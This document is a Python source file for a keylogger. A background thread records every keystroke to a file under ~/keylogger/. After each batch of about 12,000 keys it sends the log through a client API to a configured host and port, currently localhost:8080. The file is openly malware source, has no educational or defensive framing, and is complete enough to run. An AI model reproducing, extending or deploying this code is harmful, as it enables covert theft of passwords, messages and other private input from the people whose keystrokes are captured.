import os
from time import sleep

import keyboard
import uuid
import clientApi
from threading import Thread

KEYSTROKES_BATCH_SIZE = 12000  # us daily avg
HOST = "localhost"
PORT = 8080

path = R"${HOME}/keylogger/"
file_name = "logs.txt"
file_base_path = os.path.expanduser(os.path.expandvars(path))

header = "python.keylogger.user.{random_uuid}\n".format(random_uuid=uuid.uuid4())

if not (os.path.exists(file_base_path)):
    os.mkdir(file_base_path)

file_path = file_base_path + file_name

if not (os.path.exists(file_path)):
    with open(file_path, "w+") as file_0:
        file_0.write(header)


def capture_in_background():
    keys_pressed_count = 0
    while True:
        pressed_key = str(keyboard.read_key())
        print(pressed_key)

        with open(file_path, 'a') as file_1:
            file_1.write(pressed_key + "\n")

        keys_pressed_count += 1

        if keys_pressed_count > KEYSTROKES_BATCH_SIZE:
            keys_pressed_count = 0
            clientApi.upload_data(file_path, HOST, PORT)
            sleep(1)


t = Thread(target=capture_in_background)
t.start()
